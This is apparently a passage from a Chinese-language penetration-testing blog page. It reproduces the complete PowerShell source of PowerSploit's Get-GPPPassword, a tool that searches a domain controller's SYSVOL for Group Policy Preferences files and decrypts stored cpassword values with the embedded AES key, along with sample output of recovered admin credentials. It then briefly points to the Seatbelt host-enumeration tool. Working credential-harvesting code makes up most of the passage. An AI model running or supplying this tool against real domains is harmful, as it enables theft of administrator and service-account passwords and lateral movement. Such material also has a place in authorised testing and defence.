class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-GPPPassword</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PowerSploit Function: Get-GPPPassword</span></span><br><span class="line"><span class="comment">    Author: Chris Campbell (@obscuresec)</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: None</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Server</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Specify the domain controller to search for. </span></span><br><span class="line"><span class="comment">    Default&#x27;s to the users current domain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:29:53, 2014-02-21 05:29:52&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, password1234$&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:30:14, 2014-02-21 05:30:36&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, read123&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;DEMO\Administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Services\Services.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword -Server EXAMPLE.COM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB982DA&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB9AB12&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword | ForEach-Object &#123;$_.passwords&#125; | Sort-Object -Uniq</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    password</span></span><br><span class="line"><span class="comment">    password12</span></span><br><span class="line"><span class="comment">    password123</span></span><br><span class="line"><span class="comment">    password1234</span></span><br><span class="line"><span class="comment">    password1234$</span></span><br><span class="line"><span class="comment">    read123</span></span><br><span class="line"><span class="comment">    Recycling*3ftw!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html</span></span><br><span class="line"><span class="comment">    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1</span></span><br><span class="line"><span class="comment">    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences</span></span><br><span class="line"><span class="comment">    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    </span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="type">ValidateNotNullOrEmpty</span>()]</span><br><span class="line">            [<span class="built_in">String</span>]</span><br><span class="line">            <span class="variable">$Server</span> = <span class="variable">$Env:USERDNSDOMAIN</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Some XML issues between versions</span></span><br><span class="line">    <span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function that decodes and decrypts password</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">        [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">            <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">            <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                                 <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">            <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">            <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">            <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">            <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function to parse fields from xml files</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-GPPInnerFields</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            <span class="variable">$File</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$Filename</span> = <span class="built_in">Split-Path</span> <span class="variable">$File</span> <span class="literal">-Leaf</span></span><br><span class="line">            [<span class="built_in">xml</span>] <span class="variable">$Xml</span> = <span class="built_in">Get-Content</span> (<span class="variable">$File</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#declare empty arrays</span></span><br><span class="line">            <span class="variable">$Cpassword</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$UserName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$NewName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Changed</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Password</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#check for password field</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$Xml</span>.innerxml <span class="operator">-like</span> <span class="string">&quot;*cpassword*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="built_in">Write-Verbose</span> <span class="string">&quot;Potential password in <span class="variable">$File</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$Filename</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="string">&#x27;Groups.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@userName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$NewName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@newName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Services.xml&#x27;</span> &#123;  </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@accountName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Scheduledtasks.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@runAs&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;DataSources.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;                          </span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="string">&#x27;Printers.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">  </span><br><span class="line">                    <span class="string">&#x27;Drives.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">                     </span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$Pass</span> <span class="keyword">in</span> <span class="variable">$Cpassword</span>) &#123;</span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypting <span class="variable">$Pass</span>&quot;</span></span><br><span class="line">               <span class="variable">$DecryptedPassword</span> = <span class="built_in">Get-DecryptedCpassword</span> <span class="variable">$Pass</span></span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypted a password of <span class="variable">$DecryptedPassword</span>&quot;</span></span><br><span class="line">               <span class="comment">#append any new passwords to array</span></span><br><span class="line">               <span class="variable">$Password</span> += , <span class="variable">$DecryptedPassword</span></span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#put [BLANK] in variables</span></span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Password</span>)) &#123;<span class="variable">$Password</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$UserName</span>)) &#123;<span class="variable">$UserName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Changed</span>)) &#123;<span class="variable">$Changed</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$NewName</span>)) &#123;<span class="variable">$NewName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">                  </span><br><span class="line">            <span class="comment">#Create custom object to output results</span></span><br><span class="line">            <span class="variable">$ObjectProperties</span> = <span class="selector-tag">@</span>&#123;<span class="string">&#x27;Passwords&#x27;</span> = <span class="variable">$Password</span>;</span><br><span class="line">                                  <span class="string">&#x27;UserNames&#x27;</span> = <span class="variable">$UserName</span>;</span><br><span class="line">                                  <span class="string">&#x27;Changed&#x27;</span> = <span class="variable">$Changed</span>;</span><br><span class="line">                                  <span class="string">&#x27;NewName&#x27;</span> = <span class="variable">$NewName</span>;</span><br><span class="line">                                  <span class="string">&#x27;File&#x27;</span> = <span class="variable">$File</span>&#125;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$ResultsObject</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> PSObject <span class="literal">-Property</span> <span class="variable">$ObjectProperties</span></span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;The password is between &#123;&#125; and may be more than one value.&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ResultsObject</span>) &#123;<span class="keyword">Return</span> <span class="variable">$ResultsObject</span>&#125; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#ensure that machine is domain joined and script is running as a domain account</span></span><br><span class="line">        <span class="keyword">if</span> ( ( ((<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).partofdomain) <span class="operator">-eq</span> <span class="variable">$False</span> ) <span class="operator">-or</span> ( <span class="operator">-not</span> <span class="variable">$Env:USERDNSDOMAIN</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&#x27;Machine is not a domain member or User is not a member of the domain.&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#discover potential files containing passwords ; not complaining in case of denied access to a directory</span></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Searching \\<span class="variable">$Server</span>\SYSVOL. This could take a while.&quot;</span></span><br><span class="line">        <span class="variable">$XMlFiles</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&quot;\\<span class="variable">$Server</span>\SYSVOL&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="literal">-Include</span> <span class="string">&#x27;Groups.xml&#x27;</span>,<span class="string">&#x27;Services.xml&#x27;</span>,<span class="string">&#x27;Scheduledtasks.xml&#x27;</span>,<span class="string">&#x27;DataSources.xml&#x27;</span>,<span class="string">&#x27;Printers.xml&#x27;</span>,<span class="string">&#x27;Drives.xml&#x27;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ( <span class="operator">-not</span> <span class="variable">$XMlFiles</span> ) &#123;<span class="keyword">throw</span> <span class="string">&#x27;No preference files found.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Found <span class="variable">$</span>(<span class="variable">$XMLFiles</span> | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$File</span> <span class="keyword">in</span> <span class="variable">$XMLFiles</span>) &#123;</span><br><span class="line">            <span class="variable">$Result</span> = (<span class="built_in">Get-GppInnerFields</span> <span class="variable">$File</span>.Fullname)</span><br><span class="line">            <span class="built_in">Write-Output</span> <span class="variable">$Result</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h3><p>这个工具能做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#项目地址</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt</span><br></pre></td></tr></table></figure>

